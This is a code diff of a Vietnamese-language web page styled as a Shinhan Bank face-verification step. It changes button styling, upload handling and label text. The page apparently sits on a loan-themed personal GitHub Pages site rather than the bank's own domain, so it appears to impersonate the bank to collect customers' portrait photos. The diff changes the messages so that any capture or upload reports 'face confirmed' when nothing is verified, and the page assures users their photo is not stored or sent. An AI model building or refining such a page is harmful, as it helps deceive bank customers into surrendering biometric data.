@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>Shinhan Bank - Chụp Ảnh Chân Dung</title>
+    <title>Shinhan Bank - Xác Nhận Khuôn Mặt</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" defer></script>
@@ -117,6 +117,7 @@
             place-items: center;
             overflow: hidden;
             border-radius: 50%;
+            border: 1px solid #d3d3d3;
         }
         #webcamVideo {
             width: 100%;
@@ -130,7 +131,7 @@
             left: 10%;
             width: 80%;
             height: 80%;
-            border: 2px solid #ffffff;
+            border: 2px dashed #ffffff;
             border-radius: 50%;
             pointer-events: none;
             z-index: 10;
@@ -145,6 +146,14 @@
             color: #333;
             z-index: 11;
             position: relative;
+            border: 2px dashed #ffffff;
+            background: rgba(255, 255, 255, 0.8);
+            padding: 8px 15px;
+            border-radius: 5px;
+            transition: border-color 0.3s ease;
+        }
+        .face-detected + #webcamStatus {
+            border-color: #28a745;
         }
         #webcamSuccess {
             z-index: 11;
@@ -156,21 +165,29 @@
         .btn-primary {
             background-color: var(--primary-color);
             border-color: var(--primary-color);
-            padding: 8px 15px;
-            font-size: 0.9rem;
-            transition: background-color 0.3s ease, transform 0.2s ease;
+            padding: 3px 4px;
+            font-size: 0.7rem;
+            transition: all 0.3s ease;
+            position: relative;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
         }
         .btn-primary:hover {
             background-color: var(--accent-color);
             border-color: var(--accent-color);
-            transform: translateY(-2px);
+            transform: translateY(-3px) scale(1.02);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
         }
-        .btn-secondary {
-            padding: 8px 15px;
-            font-size: 0.9rem;
+        .btn-primary i {
+            font-size: 0.7rem;
+        }
+        .btn-secondary, .btn-outline-secondary {
+            padding: 4px 8px;
+            font-size: 0.8rem;
             transition: transform 0.2s ease;
         }
-        .btn-secondary:hover {
+        .btn-secondary:hover, .btn-outline-secondary:hover {
             transform: translateY(-2px);
         }
         .footer-links a {
@@ -222,12 +239,7 @@
             font-size: 1rem;
         }
         .upload-input {
-            margin-top: 10px;
-            font-size: 0.85rem;
-        }
-        .upload-input input {
-            width: 100%;
-            padding: 5px;
+            margin-top: 15px;
             font-size: 0.85rem;
         }
         #faceImagePreview {
@@ -237,6 +249,15 @@
         }
         #faceImagePreview img {
             max-height: 150px;
+        }
+        #faceImage {
+            display: none;
+        }
+        .button-group {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            flex-wrap: wrap;
         }
         @media (max-width: 768px) {
             .navbar-brand img {
@@ -266,7 +287,7 @@
             }
             .btn-primary, .btn-secondary, .btn-outline-secondary {
                 width: 100%;
-                margin-bottom: 10px;
+                margin-bottom: 8px;
             }
             .webcam-container {
                 max-width: 280px;
@@ -278,11 +299,18 @@
             .upload-input {
                 font-size: 0.8rem;
             }
-            #faceImagePreview {
-                max-height: 120px;
+            .error, .success-message {
+                font-size: 0.9rem;
             }
-            #faceImagePreview img {
-                max-height: 120px;
+            #webcamStatus {
+                font-size: 0.9rem;
+                padding: 6px 12px;
+            }
+            .nav-buttons .btn-outline-secondary {
+                align-self: start;
+            }
+            .nav-buttons .btn-primary {
+                align-self: end;
             }
         }
     </style>
@@ -320,13 +348,13 @@
         </div>
 
         <div id="faceVerificationContent">
-            <h2 class="text-center mb-3">CHỤP ẢNH CHÂN DUNG</h2>
-            <p class="text-center">Vui lòng chụp ảnh chân dung hoặc tải lên ảnh chân dung để xác minh. Ảnh của bạn không được lưu trữ hoặc gửi đi.</p>
+            <h2 class="text-center mb-3">XÁC NHẬN KHUÔN MẶT</h2>
+            <p class="text-center">Vui lòng chụp hoặc tải lên ảnh chân dung để xác minh. Ảnh của bạn không được lưu trữ hoặc gửi đi.</p>
 
             <div class="instructions">
                 <div class="instruction-item">
                     <i class="fas fa-camera"></i>
-                    <span>Đặt khuôn mặt vào giữa khung tròn</span>
+                    <span>Đặt khuôn mặt vào giữa khung ảnh</span>
                 </div>
                 <div class="instruction-item">
                     <i class="fas fa-lightbulb"></i>
@@ -342,7 +370,7 @@
                 <div class="accordion-item">
                     <h2 class="accordion-header">
                         <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#webcamSection" aria-expanded="true" aria-controls="webcamSection">
-                            Chụp Ảnh Chân Dung
+                            Xác Nhận Khuôn Mặt
                         </button>
                     </h2>
                     <div id="webcamSection" class="accordion-collapse collapse show" data-bs-parent="#faceAccordion">
@@ -354,28 +382,28 @@
                             </div>
                             <p id="webcamStatus" class="text-center mt-2">Đang chờ khuôn mặt...</p>
                             <p id="webcamError" class="error text-center"></p>
-                            <p id="webcamSuccess" class="success-message text-center">Chụp ảnh hoàn tất!</p>
-                            <div class="text-center mt-2">
-                                <button class="btn btn-primary" onclick="takeSnapshot()">Chụp Ảnh</button>
+                            <p id="webcamSuccess" class="success-message text-center">Khuôn mặt đã được xác nhận!</p>
+                            <div class="text-center mt-2 button-group">
+                                <button class="btn btn-primary" onclick="takeSnapshot()">Chụp</button>
+                                <button class="btn btn-primary" onclick="document.getElementById('faceImage').click()" title="Tải ảnh chân dung từ thiết bị">Tải</button>
+                                <input type="file" id="faceImage" accept="image/jpeg,image/png" aria-label="Tải ảnh chân dung">
                                 <button id="retryButton" class="btn btn-secondary" onclick="resetWebcam()">Thử Lại</button>
                             </div>
                             <div class="upload-input text-center">
-                                <p>Tải ảnh chân dung (JPG/PNG, < 5MB)</p>
-                                <input type="file" id="faceImage" accept="image/jpeg,image/png" aria-label="Tải ảnh chân dung">
                                 <div id="faceImagePreview"></div>
                                 <p id="faceImageError" class="error"></p>
-                                <p id="faceImageSuccess" class="success-message">Ảnh chân dung đã được tải lên!</p>
+                                <p id="faceImageSuccess" class="success-message">Khuôn mặt đã được xác nhận!</p>
                             </div>
                         </div>
                     </div>
                 </div>
             </div>
 
-            <div class="d-flex justify-content-between mt-3 flex-column flex-md-row">
-                <div class="mb-2 mb-md-0">
-                    <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/step2.html" class="btn btn-outline-secondary">QUAY LẠI</a>
+            <div class="d-flex justify-content-between mt-2 flex-column flex-md-row nav-buttons">
+                <div class="mb-2 mb-md-0 ms-0">
+                    <a href="step2.html" class="btn btn-outline-secondary">QUAY LẠI</a>
                 </div>
-                <button class="btn btn-primary position-relative" onclick="nextStep()">
+                <button class="btn btn-primary position-relative me-0" onclick="nextStep()">
                     TIẾP TỤC
                     <span class="spinner-border spinner-border-sm spinner" role="status" aria-hidden="true"></span>
                 </button>
@@ -387,7 +415,7 @@
         <div class="modal-dialog">
             <div class="modal-content">
                 <div class="modal-header">
-                    <h5 class="modal-title" id="errorModalLabel">Lỗi Webcam</h5>
+                    <h5 class="modal-title" id="errorModalLabel">Lỗi</h5>
                     <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                 </div>
                 <div class="modal-body" id="errorModalBody"></div>
@@ -424,7 +452,7 @@
     <script>
         // Global variables
         let videoElement, canvasElement, stream, tempFaceImage = null, modelsLoaded = false;
-        let imageSource = null; // 'capture' hoặc 'upload'
+        let imageSource = null; // 'capture' or 'upload'
 
         async function loadModels(attempt = 1, maxRetries = 3) {
             const primaryUri = 'https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/weights';
@@ -449,14 +477,14 @@
         function init() {
             document.addEventListener('DOMContentLoaded', async () => {
                 const timeoutPromise = new Promise((_, reject) => {
-                    setTimeout(() => reject(new Error('Tải mô hình quá lâu. Vui lòng kiểm tra mạng hoặc dùng Chụp Ảnh.')), 30000);
+                    setTimeout(() => reject(new Error('Tải mô hình quá lâu. Vui lòng kiểm tra mạng hoặc thử lại.')), 30000);
                 });
 
                 try {
                     await Promise.race([loadModels(), timeoutPromise]);
                     modelsLoaded = true;
                 } catch (error) {
-                    showErrorModal('Không thể tải mô hình nhận diện khuôn mặt: ' + error.message + '. Vui lòng thử lại hoặc dùng Chụp Ảnh.');
+                    showErrorModal('Không thể tải mô hình nhận diện khuôn mặt: ' + error.message + '. Vui lòng thử lại.');
                     console.error('Model loading failed:', error);
                 }
 
@@ -498,7 +526,7 @@
                     audio: false
                 });
                 videoElement.srcObject = stream;
-                webcamStatus.textContent = 'Webcam đã sẵn sàng. Vui lòng đặt khuôn mặt vào giữa khung.';
+                webcamStatus.textContent = 'Webcam đã sẵn sàng. Vui lòng chụp hoặc tải ảnh chân dung.';
                 faceOverlay.style.display = 'block';
                 if (modelsLoaded) detectFaces();
             } catch (error) {
@@ -537,7 +565,7 @@
                     const detections = await faceapi.detectAllFaces(videoElement, new faceapi.TinyFaceDetectorOptions());
                     if (detections.length > 0) {
                         faceOverlay.classList.add('face-detected');
-                        webcamStatus.textContent = 'Khuôn mặt đã được phát hiện. Nhấn "Chụp Ảnh" để tiếp tục.';
+                        webcamStatus.textContent = 'Khuôn mặt đã được phát hiện. Nhấn "Chụp" hoặc "Tải" để tiếp tục.';
                     } else {
                         faceOverlay.classList.remove('face-detected');
                         webcamStatus.textContent = 'Không phát hiện khuôn mặt. Vui lòng đặt khuôn mặt vào giữa khung.';
@@ -591,7 +619,7 @@
                         webcamStatus.textContent = 'Đã chụp ảnh chân dung.';
                     }
                     if (successElement) {
-                        successElement.textContent = 'Ảnh chân dung đã được chụp!';
+                        successElement.textContent = 'Khuôn mặt đã được xác nhận!';
                         successElement.style.display = 'block';
                     }
                     if (retryButton) retryButton.style.display = 'inline-block';
@@ -616,7 +644,7 @@
                     webcamStatus.textContent = 'Đã chụp ảnh chân dung.';
                 }
                 if (successElement) {
-                    successElement.textContent = 'Ảnh chân dung đã được chụp!';
+                    successElement.textContent = 'Khuôn mặt đã được xác nhận!';
                     successElement.style.display = 'block';
                 }
                 if (retryButton) retryButton.style.display = 'inline-block';
@@ -718,7 +746,7 @@
                                 previewElement.innerHTML = `<img src="${dataUri}" alt="Ảnh chân dung" style="max-width: 300px;">`;
                             }
                             if (successElement) {
-                                successElement.textContent = 'Ảnh chân dung đã được tải lên!';
+                                successElement.textContent = 'Khuôn mặt đã được xác nhận!';
                                 successElement.style.display = 'block';
                             }
                             if (retryButton) retryButton.style.display = 'inline-block';
@@ -733,7 +761,7 @@
                             previewElement.innerHTML = `<img src="${dataUri}" alt="Ảnh chân dung" style="max-width: 300px;">`;
                         }
                         if (successElement) {
-                            successElement.textContent = 'Ảnh chân dung đã được tải lên!';
+                            successElement.textContent = 'Khuôn mặt đã được xác nhận!';
                             successElement.style.display = 'block';
                         }
                         if (retryButton) retryButton.style.display = 'inline-block';
@@ -753,7 +781,7 @@
             clearMessages();
 
             if (!tempFaceImage || (imageSource !== 'capture' && imageSource !== 'upload')) {
-                if (errorElement) errorElement.textContent = 'Vui lòng chụp ảnh chân dung hoặc tải lên ảnh chân dung.';
+                if (errorElement) errorElement.textContent = 'Vui lòng chụp hoặc tải lên ảnh chân dung.';
                 return;
             }
 
